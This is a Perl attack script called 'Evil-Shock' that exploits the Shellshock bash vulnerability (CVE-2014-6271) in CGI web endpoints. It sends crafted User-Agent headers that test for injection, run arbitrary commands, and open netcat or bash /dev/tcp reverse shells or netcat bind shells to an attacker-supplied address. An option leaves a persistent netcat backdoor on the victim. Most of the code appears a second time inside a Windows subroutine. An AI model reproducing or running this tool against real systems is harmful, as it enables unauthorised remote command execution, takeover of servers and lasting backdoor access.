#! /usr/bin/perl

use Getopt::Long;
use Socket;
use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
use URI;
use HTTP::Request::Common;

GetOptions(
    "t|target=s"             => \my $target,
	"shell=s"                => \my $revshell,
	"p|port=i"               => \my $rport,
	"help+"                  => \my $help,
	"inject=s"               => \my $InjString,
	"user-agent=s"           => \my $userAg,
    "srv-persistent+"        => \my $pertsrv,
	"inject-only+"           => \my $injectOnly,
) or die "Error while setting up command-line arguments";

if($^O =~ /Win/){
   Win();
}

sub Failed{
   print "\n[!] No injection points were found!, make sure the target is vulnerable or inject your own code via --inject=<>!\n";
}


system("clear || cls");            
print q{




     ___________    ____  __   __                _______. __    __    ______     ______  __  ___  	        ___    zeeeeee                                                                      
    |   ____\   \  /   / |  | |  |              /       ||  |  |  |  /  __  \   /      ||  |/  /        .-"; ! ;"-z$$$$$$"
    |  |__   \   \/   /  |  | |  |      ______ |   (----`|  |__|  | |  |  |  | |  ,----'|  '  /       .'!  : | : d!$$$$$`
    |   __|   \      /   |  | |  |     |______| \   \    |   __   | |  |  |  | |  |     |    <       /\  ! : ! : $$$$$$\
    |  |____   \    /    |  | |  `----.     .----)   |   |  |  |  | |  `--'  | |  `----.|  .  \     /\ |  ! :|: 4$$$$$$$$$$$$                                                          	
    |_______|   \__/     |__| |_______|     |_______/    |__|  |__|  \______/   \______||__|\__\   (  \ \ ; :!: z$$$$$$$$$$$$
	                                             VERSION 1.0.0 / CODED BY GHOSTY / DEADHACKS  ( `. \ | !:|:!""""""3$$$$$
        MULTI SHELLSHOCK(CVE-2014-6271) INJECTION                                                  (`. \ \ \!:|:!/ / /z$$$$$
                    REVERSE / BIND SHELL                                                            \ `.`.\ |!|! |/,'z$$$$P 
                                                                                                     `._`.\\\!!!// .d$$$$$
                                                                                                      `.`.\\|//.'.""$$$
                                                                                                        |`._`n'_.'|  $$
                                                                                                        "----^----"   $
                                                                                                                      ^

 BETA - Coded By Ghosty 
 STILL IN DEVELOPEMENT SO WONT HAVE MUCH BANNER AND DISPLAYING BUT SITLL WORKS! 
}; 
if($pertsrv eq "1"){ print "PERSISTENT \n"; }
if($help eq '1'){
  print "Commands And Arguments: \n";
  print "   -t=<target> | -target=<target> : Will set up the target, make sure to add the cgi-bin directory for example: -t=http://ShellShock.Site/cgi-bin/status\n";
  print "\n";
  print "   -shell=<reverse / bind> : Will set the shell to use when injected in, this will take the control of the system and send you back a connection depending on the type of shell. \n";
  print "        Reverse = Evil-Shock will inject a netcat shell then listen for connections, then the victim will connect back to our listener. \n";
  print "        Bind = Evil-Shock will inject a netcat listener into the victim then connect / bind us to it.\n";
  print "\n";
  print "   -p=<port> |-port=<port> : Will set the port to reverse / bind to when injecting a shell.\n";
  print "\n";
  print "    -only-inject : Will check for Inject Points only.\n";
  print "\n";
  print "    -inject=<command> : Evil-Shock will inject the following command into the victim.\n";
  print "\n";
  print "    -user-agent=<user-agent> : Will set a specific user-agent from the user.\n";
  print "\n";
  print "    -srv-persistent : Will inject a persistent backdoor into the victim.\n";
  print "\n";
  exit(0);
}
$injectionFound = "no";
$url = URI->new( "$target" );
$domain = $url->host;
use HTML::Parse;

sub InjectCommand{
print "[+] Injecting command ($InjString) .... \n";
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("$Inject; $InjString'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
print "[+] Injected, printing responce: \n";
print "$body \n";
print " \n";
print "[+] That was the responce of the server, check for your command output or try another command. \n";
print " \n";
exit(0);
}



sub RevShell{
print "[!] What is the IP to bind to: ";
chop($bip = <stdin>);
print "[!] What is the port to bind to: "; 
chop($bport = <stdin>);
print "[+] Would you like to open a netcat reverse shell or a bash reverse shell? (n/b): ";
chop($nb = <stdin>);
if($nb eq 'n'){
   print "[+] Netcat Reverse Shell Selected ...\n";
   $userAgent2Backdoor = $ua->agent("$Inject; nc $bip $bport -e /bin/sh'");
} else {
   print "[+] Bash Reverse Shell Selected ...\n";
   $userAgent2Backdoor = $ua->agent("$Inject; bash -i >& /dev/tcp/$bip/$bport 0>&1'");
}
sub Bind2Shell{
$url = "$target";
$ua = new LWP::UserAgent;
$userAgent2Backdoor;
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
}
$iaddr = inet_aton("$domain"); 
$foo = "$iaddr";
$foolen = length $foo;
print "\n[!] IP Lenght: $foolen\n";
if($foolen eq '0'){
    print "[!] Could not auto-detect IP!\n";
    print "> IP Of $domain :> \n";
	chop($ip = <stdin>);
} else {
$iaddr = inet_aton("$domain"); 
$name  = gethostbyaddr($iaddr, AF_INET);
$straddr = inet_ntoa($iaddr);
$ip = $straddr;
}
print "\n[+] IP Of $domain: $ip\n";
print "[+] Reverse Shell was successfully injected! \n";
print "->SESSION SHELL INJECTED: $bip:$bport \n";
print "[+] Auto-Exploiting target ... \n";
print "\n\n \n";
print "[+] Listening ...\n"; 
print "[+] When Connected, you should be able to execute remote command now! (Closing the window or the script will end the reverse shell except if '--srv-persistent' was selected in command-line): \n"; 
Bind2Shell();
system("nc -lvp $bport");
}


sub BindShell{
$srv = "";
$url = "$target";
$ua = new LWP::UserAgent;
if($pertsrv eq 1){ $srv = "-k "; }
$ua->agent("$Inject; nc -l $srv-p $rport -e /bin/sh'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
$iaddr = inet_aton("$domain"); 
$foo = "$iaddr";
$foolen = length $foo;
print "[!] IP Lenght: $foolen\n";
if($foolen eq '0'){
    print "{!} Could not auto-detect IP!\n";
    print "> IP Of $domain :> \n";
	chop($ip = <stdin>);
} else {
$iaddr = inet_aton("$domain"); 
$name  = gethostbyaddr($iaddr, AF_INET);
$straddr = inet_ntoa($iaddr);
$ip = $straddr;
}
if($pertsrv eq 1){
  print "[+] PERSISTENT BACKDOOR WARNING [+]\n";
  print "[+] The persistent backdoor will not be executed at the start up, only if the process is still alive and the machine on.\n";
  print "[+] By default netcat will end the backdoor when we first got connected and exit.\n";
  print "[+] But Evil-Shock has made netcat to not end the connection even if we exit the session!\n";
  print "[!] So you can connect at anytime doing: $ip $rport\n";
  print "\n";
  print "\n";
  print "\n";

}
print "\n[+] IP Of $domain: $ip\n";
print "[+] Reverse Shell was successfully injected! \n";
print "->SESSION SHELL INJECTED: $ip:$rport \n";
print "[+] Auto-Exploiting target ... \n";
print "\n\n \n";
print "[+] Connecting...\n"; 
print "[+] Connected!, should be able to execute remote command now! (Closing the window or the script will end the bind shell): \n"; 
system("nc $ip $rport")
}


sub InjCorrect{
   if($injectionFound eq 'yes'){
   if(defined $InjString || $InjString != ''){
     InjectCommand();
   }
   print "[+] Injection Point Found!!! \n";
   print "Injection Point: $InjectPoint \n";
   if($revshell eq 'reverse'){
     print "\n[!] Getting Reverse Shell! ... \n";
     RevShell();
   } elsif ($revshell eq 'bind'){
     print "\n[!] Getting Bind Shell! ... \n";
     BindShell();   
   }
   }
}

sub InfoGrabber{
print "\n[+] Grabbing Basic Infos ...\n";
if($userAg eq '' | not defined $userAg){
  $userAg = "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/22.0.141836113 Mobile/14D27 Safari/600.1.4";
  print "[+] User Agent Set To Default: $userAg\n";
} else {
print "[+] Custom User Agent: $userAg \n";
}
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("$userAg");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body =~ /Server: \s*(.+)$/ || $body =~ /server: \s*(.+)$/){
  $server = $1;
  print "[+] Server Found: $server\n";
  if($server =~ /apache/){
    print "[+] Seems like $domain is running an apache server, which increases our chance to hack in! \n";
  }
} else {
  print "[-] Server Not Found. \n";
}
print "\n";
NSLookupInject();
}


sub NSLookupInject{ 
print "<{+++++++++++++ Testing For Injection Points +++++++++++++}>\n";
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("() { :;}; /bin/bash -c 'nslookup www.gooogle.com'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body =~ /Address 1/ || $body =~ /Address 2/ || $body =~ /Name:/){
  print "[+] Shellshock nslookup Injection was injected successfully! (Vulnerable!) \n";
  $injectionFound = "yes";
  $InjectPoint = "() { :;}; /bin/bash -c 'nslookup www.google.com'";
  print "INJECTION POINT-> $InjectPoint \n";
  $Inject = "() { :;}; /bin/bash -c 'nslookup www.google.com";
  $NSInj = "() { :;}; /bin/bash -c 'nslookup www.google.com'";
  if($injectOnly eq 1){
    print "\n";
    LsInject();
  } else {
  InjCorrect();
  }
} else {
  print "[-] Shellshock nslookup Injection was not injected successfully! (Not Vulnerable!) \n";
  print "\n";
  LsInject();
}
}

sub LsInject{ 
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("() { :;}; /bin/bash -c 'ls'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body != ''){
  print "[+] Shellshock LS Injection was injected successfully! (Vulnerable!) \n";
  $injectionFound = "yes";
  $InjectPoint = "() { :;}; /bin/bash -c 'ls'";
  print "INJECTION POINT-> $InjectPoint \n";
  $Inject = "() { :;}; /bin/bash -c 'ls";
  $lSInj = "() { :;}; /bin/bash -c 'ls'";
  if($injectOnly eq 1){
    print "\n";
    EchoInject();
  } else {
  InjCorrect();
  }
} else {
  print "[-] Shellshock LS Injection was not injected successfully! (Not Vulnerable!) \n";
  print "\n";
  EchoInject();
}
}

sub EchoInject{ 
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("() { :;}; /bin/bash -c 'echo Shellshock is fun with ShockThatShell'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body =~ /Shellshock is fun with ShockThatShell/){
  print "[+] Shellshock Echo Injection was injected successfully! (Vulnerable!) \n";
  $injectionFound = "yes";
  $InjectPoint = "() { :;}; /bin/bash -c 'echo Shellshock is fun with ShockThatShell'";
  print "INJECTION POINT-> $InjectPoint \n";
  $Inject = "() { :;}; /bin/bash -c 'echo Shellshock is fun with ShockThatShell";
  $ECHOinj = "() { :;}; /bin/bash -c 'echo Shellshock is fun with ShockThatShell";
  if($injectOnly eq 1){
    print "\n";
    PingInject();
  } else {
  InjCorrect();
  }
} else {
  print "[-] Shellshock Echo Injection was not injected successfully! (Not Vulnerable!) \n";
  print "\n";
  PingInject();
}
}


sub PingInject{
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("() { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body =~ /--- 8.8.8.8 ping statistics ---/){
  print "[+] Shellshock Ping Injection was injected successfully! (Vulnerable!) \n";
  $injectionFound = "yes";
  $InjectPoint = "() { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'";
  print "INJECTION POINT-> $InjectPoint \n";
  $Inject = "() { :;}; /bin/bash -c 'ping -c 3 8.8.8.8";
  $PINGInj = "() { :;}; /bin/bash -c 'ping -c 3 8.8.8.8";
  if($injectOnly eq 1){
    print "\n";
    exit(0);
  } else {
  InjCorrect();
  }
} else {
  print "[-] Shellshock Ping Injection was not injected successfully! (Not Vulnerable!) \n";
}
}

InfoGrabber();

sub Win{
system("clear || cls");            
print q{




     ___________    ____  __   __                _______. __    __    ______     ______  __  ___  	        ___    zeeeeee                                                                      
    |   ____\   \  /   / |  | |  |              /       ||  |  |  |  /  __  \   /      ||  |/  /        .-"; ! ;"-z$$$$$$"
    |  |__   \   \/   /  |  | |  |      ______ |   (----`|  |__|  | |  |  |  | |  ,----'|  '  /       .'!  : | : d!$$$$$`
    |   __|   \      /   |  | |  |     |______| \   \    |   __   | |  |  |  | |  |     |    <       /\  ! : ! : $$$$$$\
    |  |____   \    /    |  | |  `----.     .----)   |   |  |  |  | |  `--'  | |  `----.|  .  \     /\ |  ! :|: 4$$$$$$$$$$$$                                                          	
    |_______|   \__/     |__| |_______|     |_______/    |__|  |__|  \______/   \______||__|\__\   (  \ \ ; :!: z$$$$$$$$$$$$
	                                             VERSION 1.0.0 / CODED BY GHOSTY / DEADHACKS  ( `. \ | !:|:!""""""3$$$$$
        MULTI SHELLSHOCK(CVE-2014-6271) INJECTION                                                  (`. \ \ \!:|:!/ / /z$$$$$
                    REVERSE / BIND SHELL                                                            \ `.`.\ |!|! |/,'z$$$$P 
                                                                                                     `._`.\\\!!!// .d$$$$$
                                                                                                      `.`.\\|//.'.""$$$
                                                                                                        |`._`n'_.'|  $$
                                                                                                        "----^----"   $
                                                                                                                      ^

 BETA - Coded By Ghosty 
 STILL IN DEVELOPEMENT SO WONT HAVE MUCH BANNER AND DISPLAYING BUT SITLL WORKS! 
}; 
if($pertsrv eq "1"){ print "PERSISTENT \n"; }
if($help eq '1'){
  print "Commands And Arguments: \n";
  print "   -t=<target> | -target=<target> : Will set up the target, make sure to add the cgi-bin directory for example: -t=http://ShellShock.Site/cgi-bin/status\n";
  print "\n";
  print "   -shell=<reverse / bind> : Will set the shell to use when injected in, this will take the control of the system and send you back a connection depending on the type of shell. \n";
  print "        Reverse = Evil-Shock will inject a netcat shell then listen for connections, then the victim will connect back to our listener. \n";
  print "        Bind = Evil-Shock will inject a netcat listener into the victim then connect / bind us to it.\n";
  print "\n";
  print "   -p=<port> |-port=<port> : Will set the port to reverse / bind to when injecting a shell.\n";
  print "\n";
  print "    -only-inject : Will check for Inject Points only.\n";
  print "\n";
  print "    -inject=<command> : Evil-Shock will inject the following command into the victim.\n";
  print "\n";
  print "    -user-agent=<user-agent> : Will set a specific user-agent from the user.\n";
  print "\n";
  print "    -srv-persistent : Will inject a persistent backdoor into the victim.\n";
  print "\n";
  exit(0);
}
$injectionFound = "no";
$url = URI->new( "$target" );
$domain = $url->host;
use HTML::Parse;

sub InjectCommand{
print "[+] Injecting command ($InjString) .... \n";
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("$Inject; $InjString'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
print "[+] Injected, printing responce: \n";
print "$body \n";
print " \n";
print "[+] That was the responce of the server, check for your command output or try another command. \n";
print " \n";
exit(0);
}



sub RevShell{
print "[!] What is the IP to bind to: ";
chop($bip = <stdin>);
print "[!] What is the port to bind to: "; 
chop($bport = <stdin>);
print "[+] Would you like to open a netcat reverse shell or a bash reverse shell? (n/b): ";
chop($nb = <stdin>);
if($nb eq 'n'){
   print "[+] Netcat Reverse Shell Selected ...\n";
   $userAgent2Backdoor = $ua->agent("$Inject; nc $bip $bport -e /bin/sh'");
} else {
   print "[+] Bash Reverse Shell Selected ...\n";
   $userAgent2Backdoor = $ua->agent("$Inject; bash -i >& /dev/tcp/$bip/$bport 0>&1'");
}
sub Bind2Shell{
$url = "$target";
$ua = new LWP::UserAgent;
$userAgent2Backdoor;
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
}
$iaddr = inet_aton("$domain"); 
$foo = "$iaddr";
$foolen = length $foo;
print "\n[!] IP Lenght: $foolen\n";
if($foolen eq '0'){
    print "[!] Could not auto-detect IP!\n";
    print "> IP Of $domain :> \n";
	chop($ip = <stdin>);
} else {
$iaddr = inet_aton("$domain"); 
$name  = gethostbyaddr($iaddr, AF_INET);
$straddr = inet_ntoa($iaddr);
$ip = $straddr;
}
print "\n[+] IP Of $domain: $ip\n";
print "[+] Reverse Shell was successfully injected! \n";
print "->SESSION SHELL INJECTED: $bip:$bport \n";
print "[+] Auto-Exploiting target ... \n";
print "\n\n \n";
print "[+] Listening ...\n"; 
print "[+] When Connected, you should be able to execute remote command now! (Closing the window or the script will end the reverse shell except if '--srv-persistent' was selected in command-line): \n"; 
Bind2Shell();
system("nc.exe -lvp $bport");
}


sub BindShell{
$srv = "";
$url = "$target";
$ua = new LWP::UserAgent;
if($pertsrv eq 1){ $srv = "-k "; }
$ua->agent("$Inject; nc -l $srv-p $rport -e /bin/sh'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
$iaddr = inet_aton("$domain"); 
$foo = "$iaddr";
$foolen = length $foo;
print "[!] IP Lenght: $foolen\n";
if($foolen eq '0'){
    print "{!} Could not auto-detect IP!\n";
    print "> IP Of $domain :> \n";
	chop($ip = <stdin>);
} else {
$iaddr = inet_aton("$domain"); 
$name  = gethostbyaddr($iaddr, AF_INET);
$straddr = inet_ntoa($iaddr);
$ip = $straddr;
}
if($pertsrv eq 1){
  print "[+] PERSISTENT BACKDOOR WARNING [+]\n";
  print "[+] The persistent backdoor will not be executed at the start up, only if the process is still alive and the machine on.\n";
  print "[+] By default netcat will end the backdoor when we first got connected and exit.\n";
  print "[+] But Evil-Shock has made netcat to not end the connection even if we exit the session!\n";
  print "[!] So you can connect at anytime doing: $ip $rport\n";
  print "\n";
  print "\n";
  print "\n";

}
print "\n[+] IP Of $domain: $ip\n";
print "[+] Reverse Shell was successfully injected! \n";
print "->SESSION SHELL INJECTED: $ip:$rport \n";
print "[+] Auto-Exploiting target ... \n";
print "\n\n \n";
print "[+] Connecting...\n"; 
print "[+] Connected!, should be able to execute remote command now! (Closing the window or the script will end the bind shell): \n"; 
system("cd nc && nc.exe $ip $rport")
}


sub InjCorrect{
   if($injectionFound eq 'yes'){
   if(defined $InjString || $InjString != ''){
     InjectCommand();
   }
   print "[+] Injection Point Found!!! \n";
   print "Injection Point: $InjectPoint \n";
   if($revshell eq 'reverse'){
     print "\n[!] Getting Reverse Shell! ... \n";
     RevShell();
   } elsif ($revshell eq 'bind'){
     print "\n[!] Getting Bind Shell! ... \n";
     BindShell();   
   }
   }
}

sub InfoGrabber{
print "\n[+] Grabbing Basic Infos ...\n";
if($userAg eq '' | not defined $userAg){
  $userAg = "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/22.0.141836113 Mobile/14D27 Safari/600.1.4";
  print "[+] User Agent Set To Default: $userAg\n";
} else {
print "[+] Custom User Agent: $userAg \n";
}
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("$userAg");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body =~ /Server: \s*(.+)$/ || $body =~ /server: \s*(.+)$/){
  $server = $1;
  print "[+] Server Found: $server\n";
  if($server =~ /apache/){
    print "[+] Seems like $domain is running an apache server, which increases our chance to hack in! \n";
  }
} else {
  print "[-] Server Not Found. \n";
}
print "\n";
NSLookupInject();
}


sub NSLookupInject{ 
print "<{+++++++++++++ Testing For Injection Points +++++++++++++}>\n";
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("() { :;}; /bin/bash -c 'nslookup www.gooogle.com'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body =~ /Address 1/ || $body =~ /Address 2/ || $body =~ /Name:/){
  print "[+] Shellshock nslookup Injection was injected successfully! (Vulnerable!) \n";
  $injectionFound = "yes";
  $InjectPoint = "() { :;}; /bin/bash -c 'nslookup www.google.com'";
  print "INJECTION POINT-> $InjectPoint \n";
  $Inject = "() { :;}; /bin/bash -c 'nslookup www.google.com";
  $NSInj = "() { :;}; /bin/bash -c 'nslookup www.google.com'";
  if($injectOnly eq 1){
    print "\n";
    LsInject();
  } else {
  InjCorrect();
  }
} else {
  print "[-] Shellshock nslookup Injection was not injected successfully! (Not Vulnerable!) \n";
  print "\n";
  LsInject();
}
}

sub LsInject{ 
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("() { :;}; /bin/bash -c 'ls'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body != ''){
  print "[+] Shellshock LS Injection was injected successfully! (Vulnerable!) \n";
  $injectionFound = "yes";
  $InjectPoint = "() { :;}; /bin/bash -c 'ls'";
  print "INJECTION POINT-> $InjectPoint \n";
  $Inject = "() { :;}; /bin/bash -c 'ls";
  $lSInj = "() { :;}; /bin/bash -c 'ls'";
  if($injectOnly eq 1){
    print "\n";
    EchoInject();
  } else {
  InjCorrect();
  }
} else {
  print "[-] Shellshock LS Injection was not injected successfully! (Not Vulnerable!) \n";
  print "\n";
  EchoInject();
}
}

sub EchoInject{ 
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("() { :;}; /bin/bash -c 'echo Shellshock is fun with ShockThatShell'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body =~ /Shellshock is fun with ShockThatShell/){
  print "[+] Shellshock Echo Injection was injected successfully! (Vulnerable!) \n";
  $injectionFound = "yes";
  $InjectPoint = "() { :;}; /bin/bash -c 'echo Shellshock is fun with ShockThatShell'";
  print "INJECTION POINT-> $InjectPoint \n";
  $Inject = "() { :;}; /bin/bash -c 'echo Shellshock is fun with ShockThatShell";
  $ECHOinj = "() { :;}; /bin/bash -c 'echo Shellshock is fun with ShockThatShell";
  if($injectOnly eq 1){
    print "\n";
    PingInject();
  } else {
  InjCorrect();
  }
} else {
  print "[-] Shellshock Echo Injection was not injected successfully! (Not Vulnerable!) \n";
  print "\n";
  PingInject();
}
}


sub PingInject{
$url = "$target";
$ua = new LWP::UserAgent;
$ua->agent("() { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'");
$ua->timeout(15);
$request = HTTP::Request->new('GET');
$request->url($url);
$response = $ua->request($request);
$code = $response->code;
$headers = $response->headers_as_string;
$body =  $response->content;
if($body =~ /--- 8.8.8.8 ping statistics ---/){
  print "[+] Shellshock Ping Injection was injected successfully! (Vulnerable!) \n";
  $injectionFound = "yes";
  $InjectPoint = "() { :;}; /bin/bash -c 'ping -c 3 8.8.8.8'";
  print "INJECTION POINT-> $InjectPoint \n";
  $Inject = "() { :;}; /bin/bash -c 'ping -c 3 8.8.8.8";
  $PINGInj = "() { :;}; /bin/bash -c 'ping -c 3 8.8.8.8";
  if($injectOnly eq 1){
    print "\n";
    exit(0);
  } else {
  InjCorrect();
  }
} else {
  print "[-] Shellshock Ping Injection was not injected successfully! (Not Vulnerable!) \n";
  Failed();
  exit(0);
}
}

InfoGrabber();
}






